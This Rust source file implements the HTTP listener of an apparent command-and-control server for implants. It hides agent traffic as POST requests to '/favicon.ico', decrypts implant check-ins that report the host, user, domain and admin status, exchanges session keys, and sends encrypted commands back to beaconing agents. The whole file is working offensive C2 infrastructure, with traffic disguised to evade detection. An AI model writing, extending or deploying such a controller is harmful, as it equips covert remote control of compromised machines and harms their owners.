use actix_web::{App, HttpResponse, HttpServer, Responder, dev::ServerHandle, error::{ErrorBadRequest, ErrorInternalServerError}, guard, web};
use application::domain::model::{id::{AgentId, ListenerId}, listener_model::ListenerModel};
use std::time::Duration;
use tokio::{sync::{mpsc::{self, UnboundedSender}, oneshot}, task::JoinHandle};

use crate::{c2_message::{AgentMessage, C2Message}, listener::{listener::Listener, packet::{Command, Commands, Encrypted, MessageBody, Packet, Payload, Plain}}};

pub struct HttpListener {
    pub model: ListenerModel,
    pub handle: Option<ServerHandle>,
    pub server_task: Option<JoinHandle<anyhow::Result<()>>>,
    pub sender: mpsc::UnboundedSender<C2Message>,
}

impl Drop for HttpListener {
    fn drop(&mut self) {
        if let Some(handle) = self.handle.take() {
            tokio::spawn(handle.stop(true));
        }
    }
}

impl HttpListener {
    pub fn new(model: ListenerModel, sender: mpsc::UnboundedSender<C2Message>) -> Self {
        Self {
            model,
            handle: None,
            server_task: None,
            sender,
        }
    }

    pub fn spawn(&mut self) -> anyhow::Result<()> {
        let sender = self.sender.clone();

        let model = self.model.clone();
        let addr= (model.lhost.clone(), model.lport);

        let server = HttpServer::new(move || { 
            App::new()
                .app_data(web::Data::new(sender.clone()))
                .app_data(web::Data::new(model.clone()))
                .service(
                    web::resource("/favicon.ico").route(
                        web::route()
                            .guard(guard::Post())
                            .guard(guard::Header("Content-Type", "application/octet-stream"))
                            .to(dispatch)
                    )
                )
        })
            .workers(1)
            .bind(addr)?
            .shutdown_timeout(10)
            .disable_signals()
            .run();
        
        self.handle = Some(server.handle());
        self.server_task = Some(tokio::spawn(async move { server.await.map_err(anyhow::Error::from) }));
        Ok(())
    }

    pub async fn stop(&mut self) -> anyhow::Result<()> { 
        let handle = self.handle.take()
            .ok_or_else(|| anyhow::anyhow!("Listener not started"))?;

        let _ = tokio::spawn(tokio::time::timeout(Duration::from_secs(5), handle.stop(true))).await;
        Ok(())
    }
}

async fn dispatch(body: web::Bytes, sender: web::Data<UnboundedSender<C2Message>>, model: web::Data::<ListenerModel>) -> Result<impl Responder, actix_web::error::Error> {
    let encrypted = Packet::<Encrypted>::try_from(body.clone())
        .map_err(|e| {
            log::warn!("{e}");
            ErrorBadRequest("")
    })?;

    let checkin_key = model.checkin_key;
    
    if let Ok(decrypted) = encrypted.decrypt(checkin_key) {
        let payload = decrypted.get_payload()
            .map_err(|e| {
                log::warn!("{e}");
                ErrorBadRequest("")
            })?;
        
        match payload.data {
            MessageBody::Checkin {
                listener_id,
                process_id,
                thread_id,
                arch,
                is_admin,
                process_name,
                os,
                domain_name,
                computer_name,
                user_name,
                received_pubkey
            } => {
                // チェックインプロセス
                let (tx, rx) = oneshot::channel();
                let add_agent_msg = C2Message::AddAgent { 
                    listener_id: ListenerId::from(listener_id),
                    process_id,
                    thread_id,
                    arch,
                    is_admin,
                    process_name,
                    os,
                    domain_name,
                    computer_name,
                    user_name, 
                    received_pubkey, 
                    reply: tx, 
                };

                let _ = sender.send(add_agent_msg); 

                let (model, session_pubkey) = rx.await
                    .map_err(|e| {
                        log::warn!("{e}");
                        ErrorInternalServerError("")
                    })?
                    .map_err(|e| {
                        log::warn!("{e}");
                        ErrorInternalServerError("")
                    })?;
                
                let payload = Payload::new(MessageBody::CheckinAck { session_pubkey });
                let checkin_ack_packet = Packet::<Plain>::new(model.id.to_u128(), payload.serialize());
                let encrypted = checkin_ack_packet.encrypt(checkin_key)
                    .map_err(|e| {
                        log::warn!("{e}");
                        ErrorInternalServerError("")
                    })?;

                return Ok(HttpResponse::Ok().body(encrypted.serialize()));
            }
            _ => {
                log::warn!("expected Checkin request bad other request received.");
                return Err(ErrorBadRequest(""));
            }
        }
    };
    
    // Beatプロセス
    let encrypted = Packet::<Encrypted>::try_from(body)
        .map_err(|e| {
            log::warn!("{e}");
            ErrorBadRequest("")
    })?;

    let agent_id = AgentId::from(encrypted.get_agent_id());
    
    let (reply, rx) = oneshot::channel();
    
    let lookup_msg = C2Message::ToAgent { 
        agent_id: agent_id.clone(),
        msg: AgentMessage::LookupSharedSecret { reply },
    };

    let _ = sender.send(lookup_msg);

    let shared_secret = rx.await
       .map_err(|e| {
           log::warn!("{e}");
           ErrorInternalServerError("")
       })?
       .map_err(|e| {
           log::warn!("{e}");
           ErrorInternalServerError("")
       })?;
    
    let payload = Payload::new(MessageBody::Command { 
        commands: Commands(vec![Command::Whoami]) // TODO
    });

    let response_packet = Packet::<Plain>::new(agent_id.to_u128(), payload.serialize());

    let encrypted = response_packet.encrypt(shared_secret)
        .map_err(|e| {
           log::warn!("{e}");
           ErrorInternalServerError("")
        })?;
    
    Ok(HttpResponse::Ok().body(encrypted.serialize()))
}


#[async_trait::async_trait]
impl Listener for HttpListener {
    fn start(&mut self) -> anyhow::Result<()> {
        self.spawn()
    }

    async fn stop(&mut self) -> anyhow::Result<()> {
        self.stop().await
    }

}
